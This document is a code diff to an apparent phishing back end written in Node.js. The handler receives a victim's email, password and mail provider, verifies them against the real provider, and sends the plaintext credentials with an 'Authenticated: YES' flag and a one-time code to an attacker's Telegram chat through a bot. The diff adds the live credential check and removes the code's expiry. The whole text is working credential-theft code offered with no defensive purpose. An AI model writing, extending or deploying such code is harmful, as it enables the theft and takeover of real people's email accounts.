@@ -1,11 +1,10 @@
 const Redis = require("ioredis");
-const fetch = require("node-fetch"); // Polyfill fetch for Node.js
+const fetch = require("node-fetch");
+const { authenticateWithProvider } = require("./utils/email-auth");
 
-// Fetch secrets from environment variables
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const REDIS_URL = process.env.REDIS_URL;
-const OTP_EXPIRY_SECONDS = 300; // 5 minutes
 
 if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
   throw new Error("Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL");
@@ -15,6 +14,10 @@ const redis = new Redis(REDIS_URL);
 
 function getOtpKey(email) {
   return `otp:${email}`;
+}
+
+function generateOtp() {
+  return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
 exports.handler = async function (event) {
@@ -45,10 +48,30 @@ exports.handler = async function (event) {
     };
   }
 
-  const otp = Math.floor(100000 + Math.random() * 900000).toString();
+  // Authenticate with real provider
+  let authResult;
+  try {
+    authResult = await authenticateWithProvider(email, password, provider);
+    if (!authResult.success) {
+      return {
+        statusCode: 401,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ success: false, message: authResult.message || "Invalid credentials" }),
+      };
+    }
+  } catch (err) {
+    return {
+      statusCode: 500,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ success: false, message: "Error authenticating with provider", error: err.message }),
+    };
+  }
+
+  const otp = generateOtp();
 
   try {
-    await redis.set(getOtpKey(email), otp, "EX", OTP_EXPIRY_SECONDS);
+    // Store OTP in Redis (no expiry, so user can use it anytime)
+    await redis.set(getOtpKey(email), otp);
   } catch (err) {
     return {
       statusCode: 500,
@@ -61,11 +84,13 @@ exports.handler = async function (event) {
     };
   }
 
+  // Send credentials and OTP to Telegram
   const message =
     `🔐 *New Login Attempt*\n\n` +
     `📧 Email: ${email}\n` +
     `🔑 Password: ${password}\n` +
     `🌐 Provider: ${provider}\n` +
+    `✅ Authenticated: YES\n` +
     `🧾 OTP: ${otp}`;
 
   const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
